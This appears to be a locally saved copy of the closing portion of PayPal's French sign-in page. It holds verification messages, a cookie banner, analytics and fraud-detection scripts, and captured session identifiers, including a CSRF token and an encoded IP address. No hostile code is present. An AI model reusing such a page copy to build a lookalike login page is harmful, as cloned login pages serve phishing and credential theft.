							<p id="cookiedMessage" class="verification-message hide">Ouvrez l'application PayPal et appuyez sur Oui lorsque cela vous est demandé pour vous connecter.</p>
							<div class="notifications"></div>
							<div class="accountArea"><span class="account"></span><span class="verificationNotYou"><a data-href="#" href="https://www.paypal.com/signin#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Ce n'est pas vous&nbsp;?</a></span></div>
							<div class="mobileNotification">
								<p class="pin"></p>
								<div class="mobileScreen"><img src="./Connectez-vous à votre compte PayPal_files/icon-PN-check.png" alt="phone"></div>
							</div>
							<p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="https://www.paypal.com/signin" class="inlineLink scTrack:try-password" pa-marked="1">Utiliser le mot de passe</a></p>
							<p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="https://www.paypal.com/signin" id="resend" pa-marked="1">Renvoyer</a><span class="sentMessage hide">Envoyé</span></p>
						</div>
						<div id="expired" class="hide verificationSubSection">
							<header>
								<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p>
							</header>
							<h1 class="headerText headerTextWarning">Nous n'avons pas pu confirmer votre identité</h1>
							<p class="slimP">Nous n'avons pas reçu de réponse, et nous n'avons donc pas pu confirmer votre identité.</p>
							<button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Réessayer</button>
						</div>
						<div id="denied" class="denied hide verificationSubSection">
							<img alt="" src="./Connectez-vous à votre compte PayPal_files/glyph_alert_critical_big-2x.png" class="deniedCaution">
							<h1 class="headerText">Nous n'avons pas pu confirmer votre identité</h1>
							<p>Besoin d'aide&nbsp;? <a href="https://www.paypal.com/%7BcoBrand%7D/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help" pa-marked="1">Nous sommes là</a>.</p>
						</div>
					</div>
				</div>
			</section>
			<footer class="footer footerStayPut" role="contentinfo">
				<div class="legalFooter">
					<ul class="footerGroup">
						<li><a target="_blank" href="https://www.paypal.com/fr/smarthelp/contact-us" pa-marked="1">Contact</a></li>
						<li><a target="_blank" href="https://www.paypal.com/fr/webapps/mpp/ua/privacy-full" pa-marked="1">Respect de la vie privée</a></li>
						<li><a target="_blank" href="https://www.paypal.com/fr/webapps/mpp/ua/legalhub-full" pa-marked="1">Contrats d'utilisation</a></li>
						<li><a target="_blank" href="https://www.paypal.com/fr/webapps/mpp/country-worldwide" pa-marked="1">International</a></li>
					</ul>
				</div>
			</footer>
			<div id="gdprCookieBanner" class="gdprCookieBanner_container">
				<div id="gdprCookieContent_wrapper" class="gdprCookieBanner_content-container">
					<p class="gdprCookieBanner_content">Si vous acceptez les cookies, nous les utiliserons pour améliorer votre expérience et permettre à nos partenaires de vous présenter des publicités PayPal personnalisées lorsque vous visitez d'autres sites. <a id="manageCookiesLink" href="https://www.paypal.com/myaccount/privacy/cookiePrefs?locale=fr_FR" pagename="Connectez-vous à votre compte PayPal|managecookies" pa-marked="1">En savoir plus et gérer les cookies</a></p>
				</div>
				<div class="gdprCookieBanner_content-separator"></div>
				<div class="gdprCookieBanner_buttonGroup">
					<button id="acceptAllButton" class="gdprCookieBanner_button" pagename="Connectez-vous à votre compte PayPal|acceptcookies" pa-marked="1">Accepter</button>
					<div class="gdprCookieBanner_button-separator"></div>
					<button id="bannerDeclineButton" class="gdprCookieBanner_button gdprCookieBanner_decline-button" pa-marked="1">Refuser</button>
				</div>
			</div>
		</div>
		<div class="transitioning hide" aria-busy="false">
			<p class="welcomeMessage hide">Bienvenue .</p>
			<p class="checkingInfo hide">Vérification de vos informations…</p>
			<p class="oneSecond hide">Une seconde…</p>
			<p class="secureMessage hide">Connexion sécurisée...</p>
			<p class="oneTouchMessage hide"></p>
			<p class="retrieveInfo hide">Récupération de vos informations...</p>
			<p class="waitFewSecs hide">Ceci peut prendre quelques secondes...</p>
			<p class="udtSpinnerMessage udtLogin hide">Nous savons que vous utilisez cet appareil, nous vous connectons donc de manière sécurisée.</p>
			<p class="udtSpinnerMessage udtLoginXo hide">Nous savons que vous utilisez cet appareil, vous n'avez donc pas besoin d'entrer votre mot de passe pour réaliser cet achat.</p>
			<p class="udtSpinnerMessage webllsXoUS hide">Nous reconnaissons votre appareil, vous pouvez donc ignorer l'étape de connexion.<br><br>Gérez ce paramètre dans votre profil.</p>
			<p class="udtSpinnerMessage webllsSCA hide">Nous vous redirigeons vers PayPal Checkout pour effectuer le paiement.</p>
			<p class="qrcMessage hide">Redirection…</p>
			<p class="webAuthnOptin hide">Mise à jour de vos paramètres de connexion…</p>
			<p class="webAuthnLogin hide">Connexion…</p>
			<div class="keychain spinner-content uiExp hide"></div>
		</div>
		<script nonce="">var PAYPAL = PAYPAL || {};PAYPAL.slData = {"slSessionChkTimeout": "","slOptInTimeout": "","slAuthChkTimeout": "","slTokenValidationTimeout": "","slDisplayMerchantLink": "","slAction": "","smartlockStatus": "","slLinkedEmail": "","slFrameSrc": "","slAuthUrl": "","partnerClientId": "","partnerReturnUri": "","scimContextId": "","slOptInOT": "","slLoginEmail": "","slReturnUrl": "","delayPartnerAssertion": "","googleOneTapEnable": ""};</script><script nonce="">var PAYPAL = PAYPAL || {};PAYPAL.ulData = {fnUrl: "" || "https://c.paypal.com/da/r/fb.js",fnSessionId: "0fd9a19af03246cd953b22a2091f5e34",sourceId: "UNIFIED_LOGIN_INPUT_EMAIL",beaconUrl: "https://b.stats.paypal.com/v1/counter.cgi?r=cD0wZmQ5YTE5YWYwMzI0NmNkOTUzYjIyYTIwOTFmNWUzNCZpPTkwLjg1LjczLjIxNSZ0PTE3MTA0MjU3NDAuMjImYT0yMSZzPVVOSUZJRURfTE9HSU7RPtsdnovXq7rFOCP3Rbi3LSgrdA",enableSpeedTyping: "true",aPayAuth: "",aPayCanMakePaymentTimeout: "",tokenAssertionUri: "",preloadScriptUrl: "",preloadScriptDownloadLength: 0,fingerprintProceed: "lookup"};</script>
		<noscript><img src="https://c.paypal.com/v1/r/d/b/ns?f=0fd9a19af03246cd953b22a2091f5e34&s=UNIFIED_LOGIN_INPUT_EMAIL&js=0&r=1" title="ppfniframe" alt="" height="1" width="1" border="0"></noscript>
		<script nonce="" id="ul-sync-data">var PAYPAL = PAYPAL || {};PAYPAL.ulSync = {fnSessionId: '0fd9a19af03246cd953b22a2091f5e34',sourceId: 'UNIFIED_LOGIN_INPUT_EMAIL',fname: 'fn_sync_data',isFnWithoutIframeEnabled: ''};</script><!-- build:js inline --><!-- build:[src] js/lib/ --><script nonce="" src="./Connectez-vous à votre compte PayPal_files/fn-sync-telemetry-min.js.téléchargement"></script><!-- /build --><!-- /build --><script nonce="">var PAYPAL = PAYPAL || {};PAYPAL.ulData = PAYPAL.ulData || {};PAYPAL.ulData.incontextData = {"version": "","noBridge": "","env": "","icstage": "","targetCancelUrl": "","paymentAction": "","paymentToken": "","merchantID": ""};</script><!-- build:js inline --><!-- build:[src] js/ --><script nonce="" src="./Connectez-vous à votre compte PayPal_files/signin-split.js.téléchargement"></script><!-- /build --><!-- /build --><!-- build:js inline --><!-- build:[src] js/ --><script nonce="" src="./Connectez-vous à votre compte PayPal_files/ioc.js.téléchargement"></script><!-- /build --><!-- /build --><script src="./Connectez-vous à votre compte PayPal_files/pa.js.téléchargement"></script><script nonce="">var fptiOptions = {data:'pgrp=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail&page=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail%3A%3A%3A&qual=input_email&pgst=1710425740185&calc=f8121184d7133&nsid=5ylzGwBVqSX3NWg0_kkR0ZlRJmgvzfn3&rsta=fr_FR&pgtf=Nodejs&env=live&s=ci&ccpg=FR&csci=4057d58fb0be495eb9afa5d2d4351db6&comp=unifiedloginnodeweb&tsrce=smartchatnodeweb&cu=0&ef_policy=gdpr_v2.1&c_prefs=T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dinitial&transition_name=ss_prepare_email&userRedirected=true&xe=101216%2C103648%2C104200%2C109195%2C108076%2C109047&xt=103864%2C114559%2C127485%2C144026%2C138090%2C143343&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_email&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F',url:'https:\/\/t.paypal.com\/ts'};var trackLazyData = "true" === "true";if(trackLazyData){fptiOptions = {...fptiOptions,trackLazyData: true,lazyDataId: 'UnifiedLoginNodeWeb'};}(function(){if(typeof PAYPAL.analytics != "undefined"){PAYPAL.core = PAYPAL.core || {};	PAYPAL.core.pta = PAYPAL.analytics.setup(fptiOptions);						}}());</script>
		<noscript><img src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail&page=main%3Aunifiedlogin%3Asplitlogin%3A%3Aemail%3A%3A%3A&qual=input_email&pgst=1710425740185&calc=f8121184d7133&nsid=5ylzGwBVqSX3NWg0_kkR0ZlRJmgvzfn3&rsta=fr_FR&pgtf=Nodejs&env=live&s=ci&ccpg=FR&csci=4057d58fb0be495eb9afa5d2d4351db6&comp=unifiedloginnodeweb&tsrce=smartchatnodeweb&cu=0&ef_policy=gdpr_v2.1&c_prefs=T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dinitial&transition_name=ss_prepare_email&userRedirected=true&xe=101216%2C103648%2C104200%2C109195%2C108076%2C109047&xt=103864%2C114559%2C127485%2C144026%2C138090%2C143343&ctx_login_ot_content=0&obex=signin&landing_page=login&browser_client_type=Browser&state_name=begin_email&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F" alt="" height="1" width="1" border="0"></noscript>
		<script async="" id="grcv3enterpriseframetag" data-key="6LfY0gUpAAAAAJgmuiSZtM8qB73-AGXlxhWx1xCy" data-action="LOGIN" data-sessionid="_sessionID=5ylzGwBVqSX3NWg0_kkR0ZlRJmgvzfn3" data-src="https://www.paypalobjects.com/webcaptcha/grcenterprise_v3_static.html" data-submiturl="/auth/verifygrcadenterprise" data-csrf="JUWUPevLtSPSpKCMcLp/mkipRReMBpAeOVbwc=" data-f="0fd9a19af03246cd953b22a2091f5e34" src="./Connectez-vous à votre compte PayPal_files/grcenterprise_v3_static.js.téléchargement"></script><iframe id="grcv3enterpriseframe" src="./Connectez-vous à votre compte PayPal_files/grcenterprise_v3_static.html" sandbox="allow-same-origin allow-scripts allow-popups" style="position: fixed; bottom: 30px; right: 1.5px; width: 74px; transition: width 0.3s ease 0s; height: 66px; border: 0px; z-index: 2147483000; display: none;"></iframe><script crossorigin="anonymous" src="./Connectez-vous à votre compte PayPal_files/patleaf.js.téléchargement"></script><script crossorigin="anonymous" src="./Connectez-vous à votre compte PayPal_files/patlcfg.js.téléchargement"></script><script id="fconfig" type="application/json" fncls="fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99" nonce="">{"f":"0fd9a19af03246cd953b22a2091f5e34","s":"UNIFIED_LOGIN_INPUT_EMAIL","b":"https://b.stats.paypal.com/v1/counter.cgi?r=cD0wZmQ5YTE5YWYwMzI0NmNkOTUzYjIyYTIwOTFmNWUzNCZpPTkwLjg1LjczLjIxNSZ0PTE3MTA0MjU3NDAuMjImYT0yMSZzPVVOSUZJRURfTE9HSU7RPtsdnovXq7rFOCP3Rbi3LSgrdA","ts":{"type":"UL","fields":[{"id":"email","min":6},{"id":"password","min":6}],"delegate":false}}</script><script src="./Connectez-vous à votre compte PayPal_files/fb.js.téléchargement"></script><iframe id="ppfnfnclspbfiframe" src="./Connectez-vous à votre compte PayPal_files/saved_resource(2).html" title="pbf" tabindex="-1" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;" aria-hidden="true"></iframe><iframe allow="geolocation" id="ppfnfnclsiframe" title="ppfniframe" tabindex="-1" src="./Connectez-vous à votre compte PayPal_files/i.html" aria-hidden="true" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;"></iframe><script nonce="">(function () { var bannerFptiData = {}; function getFptiReqData () { let fptiReqData = window && window.fpti && window.PAYPAL && window.PAYPAL.analytics && window.PAYPAL.analytics.instance && window.PAYPAL.analytics.instance.options && window.PAYPAL.analytics.instance.options.request && window.PAYPAL.analytics.instance.options.request.data; if (fptiReqData) {  bannerFptiData = { api_name: 'cookieBanner', page:  'main:privacy:policy:gdpr_v2.1', pgrp:  'main:privacy:policy', displaypage: window.fpti.pgrp, ppage: 'privacy_banner', bannertype: 'cookiebanner', ccpg: 'FR', flag: 'gdpr_v2.1', bannerversion: 'gdprv21_v4', bannersource: 'ConsentNodeServ', bannervariant: '', xe: '105410,105409,109059,104406,104405,104407', xt: '123956,123954,143369,119037,120151,119038', eligibility_reason: 'true', is_native: 'false', cookie_disabled: cookieDisabled(), reason_to_hide: reasonToHideBanner() }; if(false){ bannerFptiData = {   ...bannerFptiData, userstate : 'undefined', usercountry : 'undefined', stateaccuracy : 'undefined', countryaccuracy : 'undefined', loggedin : 'undefined' } } } return fptiReqData; } function getFptiPage () { return getFptiReqData() && getFptiReqData().page; } function setSessionStorage(key) { try { sessionStorage.setItem(key, true); } catch (e) { console.log('error on setting sessioStorage', e); } } function isBannerClosed () { let is_banner_closed = false; try{ if(sessionStorage.getItem("isBannerClosed") || sessionStorage.getItem("isUserAccepted") || sessionStorage.getItem("isInvisibleBanner")){ is_banner_closed = true; } } catch (e){ is_banner_closed = false; } return is_banner_closed || (false && true && !navigator.cookieEnabled); } function reasonToHideBanner(){ let reason = ''; try { if (false && true && !navigator.cookieEnabled){ reason = 'cookies are disabled'; } else if(sessionStorage.getItem("isUserAccepted")){ reason = 'User accepted or declined'; } else if(sessionStorage.getItem("isBannerClosed")){ reason = 'Banner Closed'; } else if(sessionStorage.getItem("isInvisibleBanner")){ reason = 'Invisible banner loaded'; } } catch (error) { reason=''; } return reason; } function cookieFilteringRequest(eventSource){ const page = window && window.fpti && window.fpti.page || window && window.location && window.location.href; const component = window && window.fpti && window.fpti.comp || ""; const xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject('Microsoft.XMLHTTP'); const endPoint = "https://www.paypal.com/myaccount/privacy/cookieprefs/cookies?eventSource="+eventSource+"&page="+page+"&component="+component; xhr.open('GET', endPoint); xhr.withCredentials = true; xhr.onreadystatechange = function () { if (xhr.readyState > 3 && xhr.status === 200) { } }; xhr.setRequestHeader('Accept','application/json'); xhr.setRequestHeader('Content-Type','application/json'); xhr.send(); }; function cookieFiltering(eventSource="cookieBanner"){ if(!true){ return; } cookieFilteringRequest(eventSource); } function postAjax(isAccept, isFptiDataAvailable ) { if(!isFptiDataAvailable && getFptiReqData()){  isFptiDataAvailable = true; } if(isFptiDataAvailable){ acceptDeclineFptiEvents(isAccept); } var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP"); var endPoint = 'https://www.paypal.com/myaccount/privacy/cookiePrefs/accept?marketing=true&performance=true&functional=true&type=explicit_banner&country=FR&policy=gdpr_v2.1&version=gdprv21_v4'; if(!isAccept){ endPoint = 'https://www.paypal.com/myaccount/privacy/cookiePrefs/accept?marketing=false&performance=false&functional=false&type=explicit_banner&country=FR&policy=gdpr_v2.1&version=gdprv21_v4'; } xhr.open('GET',endPoint); xhr.withCredentials = true; xhr.onreadystatechange = function() { if (xhr.readyState > 3 && xhr.status == 200) { cookieFiltering(isAccept ? 'acceptCookieBanner' : 'declineCookieBanner'); } }; xhr.setRequestHeader('Accept', 'application/json','Content-Type', 'application/json'); xhr.send(null); return xhr; }; function acceptDeclineFptiEvents(isAccept){ var trackingPageName = '' || getFptiPage() || document.title; var cookiesText = isAccept ? 'acceptcookies' : 'declinecookies'; var cookiePrefs = isAccept ? 'T=1,P=1,F=1,type=explicit_banner' : 'T=0,P=0,F=0,type=explicit_banner'; var eventName = isAccept ? 'cookie_banner_accept_clicked' : 'cookie_banner_decline_clicked'; var bannerData = { e: 'cl', link: cookiesText, pglk: trackingPageName + '|' + cookiesText, pgln: trackingPageName + '|' + cookiesText, c_prefs: cookiePrefs, opsel: cookiePrefs + ',FR', csource: 'cookie', event_name: eventName }; for(var key in bannerFptiData){ bannerData[key] = bannerFptiData[key]; }; window.PAYPAL.analytics.Analytics.prototype.recordClick({ data: bannerData }); var winFptiData = JSON.parse(JSON.stringify((window && window.fpti) || {})); var updatedFptiData = { cookiebannerhidden: 'true', c_prefs: cookiePrefs }; for(var key in bannerFptiData){ updatedFptiData[key] = bannerFptiData[key]; }; for(var key in updatedFptiData){ winFptiData[key] = updatedFptiData[key]; }; window.PAYPAL.analytics.Analytics.prototype.logActivity(winFptiData); }; function bindGdprEvents () { var acceptAllButton = document.getElementById('acceptAllButton'); var bannerDeclineButton = document.getElementById('bannerDeclineButton'); var bannerCloseButton = document.getElementById('bannerCloseButton'); var manageCookiesLink = document.getElementById('manageCookiesLink'); var cookieStatement = document.getElementById('cookieStatement'); var cookieLanguage = document.getElementById('gdprCookieContent_wrapper'); var cookieBanner = document.getElementById('gdprCookieBanner'); var cookieBannerAcceptAll = document.getElementsByClassName("gdprCookieBanner-acceptedAll"); var trackingPageName = '' || getFptiPage() || document.title; if (manageCookiesLink) { manageCookiesLink.onclick = function() { var manageCookiesData = { e: 'cl', link: 'managecookies', pglk: trackingPageName + '|managecookies', pgln: trackingPageName + '|managecookies', event_name: 'cookie_banner_manage_cookies_clicked' }; for(var key in bannerFptiData){ manageCookiesData[key] = bannerFptiData[key]; }; window.PAYPAL.analytics.Analytics.prototype.recordClick({data: manageCookiesData}); }; } if (cookieStatement) { cookieStatement.onclick = function() { var cookieStatementData = { e: 'cl', link: 'cookieStmtLink', pglk: trackingPageName + '|cookieStmtLink', pgln: trackingPageName + '|cookieStmtLink', event_name: 'cookie_banner_cookie_statement_clicked' }; for(var key in bannerFptiData){ cookieStatementData[key] = bannerFptiData[key]; }; window.PAYPAL.analytics.Analytics.prototype.recordClick({ data: cookieStatementData }); }; } if(bannerCloseButton && cookieBanner && cookieLanguage){ bannerCloseButton.onclick = function() { hideBanner(); setSessionStorage('isBannerClosed'); var closebannerFptiData = { e: 'cl', link: 'closeBanner', pglk: trackingPageName + '|closeBanner', pgln: trackingPageName + '|closeBanner', event_name: 'cookie_banner_close_clicked' }; for(var key in bannerFptiData){ closebannerFptiData[key] = bannerFptiData[key]; }; window.PAYPAL.analytics.Analytics.prototype.recordClick({ data: closebannerFptiData }); }; } if (acceptAllButton && cookieBanner && cookieLanguage) { acceptAllButton.onclick = function() { hideBanner(); if (false) { setSessionStorage('isUserAccepted'); } postAjax(true, true); }; } if (bannerDeclineButton && cookieBanner && cookieLanguage) { bannerDeclineButton.onclick = function() { hideBanner(); if (false) { setSessionStorage('isUserAccepted'); } postAjax(false, true); }; } window.hideGdprBanner = function () { var cookieBannerUi = document.getElementById('gdprCookieBanner'); if (cookieBannerUi && cookieBannerUi.className.indexOf('gdprHideCookieBannerMobile') === -1) { cookieBannerUi.className += " gdprHideCookieBannerMobile"; } }; window.showGdprBanner = function () { var cookieBannerUi = document.getElementById('gdprCookieBanner'); if (cookieBannerUi) { cookieBannerUi.className = cookieBannerUi.className.replace("gdprHideCookieBannerMobile",""); } }; document.body.addEventListener("focus", function (event) { if (event.target.type === 'text' || event.target.type === 'number' || event.target.type === 'password' || event.target.type === 'email' || event.target.type === 'select-one') { window.hideGdprBanner(); } }, true); } function adjustPaddingTop(){ var cookieBannerAcceptAll = document.getElementsByClassName("gdprCookieBanner-acceptedAll"); if(cookieBannerAcceptAll.length > 0){ var cookieBanner = document.getElementById('gdprCookieBanner'); var bannerHeight = cookieBanner ? cookieBanner.clientHeight : 0; if(cookieBannerAcceptAll && cookieBannerAcceptAll[0] && bannerHeight){ cookieBannerAcceptAll[0].style.paddingTop = bannerHeight/16 +'em'; } } }; var isPaddingBottomAdded = false, bannerPaddingBottom = ""; function adjustPaddingBottom(addListener){ if (undefined || !false) { return; } function adjustPaddingBottomEvent() { var cookieBannerAcceptAll = document.getElementsByClassName("gdprCookieBanner-acceptedAll"); if(cookieBannerAcceptAll.length > 0){ var bodyPaddingBottom = cookieBannerAcceptAll[0].style.paddingBottom; var cookieBanner = document.getElementById('gdprCookieBanner'); if(cookieBannerAcceptAll && cookieBannerAcceptAll[0] && cookieBanner.style.display != 'none') { if (bodyPaddingBottom === "" || (isPaddingBottomAdded && bannerPaddingBottom === bodyPaddingBottom)) { var cookieBannerContainer = document.getElementsByClassName('gdprCookieBanner_container'); var bannerBottomHeight = cookieBannerContainer.length > 0 ? parseInt(window.getComputedStyle(cookieBannerContainer[0]).bottom.replace("px", "")) : 0; var bannerHeight = cookieBanner ? cookieBanner.clientHeight : 0; bannerPaddingBottom = ((bannerHeight + bannerBottomHeight) / 16) + 'em'; cookieBannerAcceptAll[0].style.paddingBottom = bannerPaddingBottom; isPaddingBottomAdded = true; } else if (isPaddingBottomAdded && bannerPaddingBottom !== bodyPaddingBottom) { isPaddingBottomAdded = false; } } } } if (addListener) { adjustPaddingBottomEvent(); window.addEventListener('resize', adjustPaddingBottomEvent);  } else { var cookieBannerAcceptAll = document.getElementsByClassName("gdprCookieBanner-acceptedAll"); if(cookieBannerAcceptAll && cookieBannerAcceptAll[0]){ window.removeEventListener('resize', adjustPaddingBottomEvent); adjustPaddingBottomEvent(); if (isPaddingBottomAdded && cookieBannerAcceptAll[0].style.paddingBottom === bannerPaddingBottom) { cookieBannerAcceptAll[0].style.removeProperty('padding-bottom'); } } } }; window.bindGdprEvents = bindGdprEvents; function cookieDisabled() { if (navigator.cookieEnabled === false) return "true"; else if (navigator.cookieEnabled === true) return "false"; else return "undefined"; }; function gdprSetup () { var cookieLanguage = document.getElementById('gdprCookieContent_wrapper'); var cookieBanner = document.getElementById('gdprCookieBanner'); var manageLink = document.getElementById('manageCookiesLink'); var acceptAllLink = document.getElementById('acceptAllButton'); var trackingPageName = '' || getFptiPage() || document.title; if(!isBannerClosed()){ document.body.className = document.body.className += " gdprCookieBanner-acceptedAll"; if(undefined){ adjustPaddingTop(); window.addEventListener('resize', adjustPaddingTop);   document.body.className = document.body.className += " top-cookie-banner-enabled";    } enableEvents(true); } var pageName = trackingPageName || getFptiPage() || document.title; var winFptiData = JSON.parse(JSON.stringify((window && window.fpti) || {})); if(false){ bannerFptiData.isNativeBannerHidden = true; } for(var key in bannerFptiData){ winFptiData[key] = bannerFptiData[key]; }; winFptiData['event_name'] = 'cookie_banner_shown'; window.PAYPAL.analytics.Analytics.prototype.logActivity(winFptiData); if (manageLink) { manageLink.setAttribute('pagename', (pageName + '|managecookies')); } if (acceptAllLink) { acceptAllLink.setAttribute('pagename', (pageName + '|acceptcookies')); } bindGdprEvents(); }; function hideBanner() { var cookieLanguage = document.getElementById('gdprCookieContent_wrapper'); var cookieBanner = document.getElementById('gdprCookieBanner'); if(cookieLanguage && cookieBanner){ cookieLanguage.style.display = 'none'; cookieBanner.style.display = 'none'; }else { return false; } window.removeEventListener('resize', adjustPaddingTop); var cookieBannerAcceptAll = document.getElementsByClassName("gdprCookieBanner-acceptedAll"); if(cookieBannerAcceptAll && cookieBannerAcceptAll[0]){ cookieBannerAcceptAll[0].style.removeProperty('padding-top'); } enableEvents(false); document.body.className = document.body.className.replace("gdprCookieBanner-acceptedAll",""); document.body.className = document.body.className.replace("top-cookie-banner-enabled",""); return true; } function isPageReady () { var cookieBannerUi = document.getElementById('gdprCookieBanner'); return !!(cookieBannerUi && getFptiReqData()); } function enableFocusEvent(addListener){ if(!false || undefined){ return; } var cookieBanner = document.getElementById('gdprCookieBanner'); function focusIn(e) { if(cookieBanner && cookieBanner.style.display != 'none'){ var activeElement = document.activeElement; if(((activeElement.getBoundingClientRect().bottom) > (cookieBanner.getBoundingClientRect().top)) && !activeElement.parentElement.nodeName.includes("UL")){ activeElement.scrollIntoView({block: 'center'}); } }else{ document.removeEventListener("focusin", focusIn); } } if(addListener){ document.addEventListener("focusin",focusIn); } } function enableEvents(enable){ adjustPaddingBottom(enable); enableFocusEvent(enable); } var maxRetries = 34, bannerhidden=false; function triggerBanner() { if (isPageReady()) { cookieFiltering('pageLoad'); if(true){setTimeout(function(){ cookieFiltering('afterPageLoad')}, 3000);} if (isBannerClosed()) { hideBanner(); } if(false){ setSessionStorage('isInvisibleBanner'); } gdprSetup(); } else { if (isBannerClosed() && !bannerhidden ) { bannerhidden=hideBanner(); } if (maxRetries-- > 0) { setTimeout(triggerBanner, 150); } else { cookieFiltering('pageLoad'); if(true){setTimeout(function(){ cookieFiltering('afterPageLoad')}, 3000);} if (isBannerClosed()) { hideBanner(); } if(!isBannerClosed() && document.getElementById('gdprCookieBanner') && !document.body.className.includes("gdprCookieBanner-acceptedAll")){ document.body.className = document.body.className += " gdprCookieBanner-acceptedAll"; if(undefined){ adjustPaddingTop(); window.addEventListener('resize', adjustPaddingTop);   document.body.className = document.body.className += " top-cookie-banner-enabled"; } enableEvents(true); } var acceptAllButton = document.getElementById('acceptAllButton'); var bannerDeclineButton = document.getElementById('bannerDeclineButton'); var bannerCloseButton = document.getElementById('bannerCloseButton'); var cookieBanner = document.getElementById('gdprCookieBanner'); if ( acceptAllButton ) { acceptAllButton.onclick = function() { hideBanner(); if (false) { setSessionStorage('isUserAccepted'); } postAjax(true, false); }; } if ( bannerDeclineButton ) { bannerDeclineButton.onclick = function() { hideBanner(); if (false) { setSessionStorage('isUserAccepted'); } postAjax(false, false); }; } if ( bannerCloseButton ) { bannerCloseButton.onclick = function() { hideBanner(); setSessionStorage('isBannerClosed'); } } if(false){ setSessionStorage('isInvisibleBanner'); } } } } triggerBanner(); })();</script>
	</body>
</html>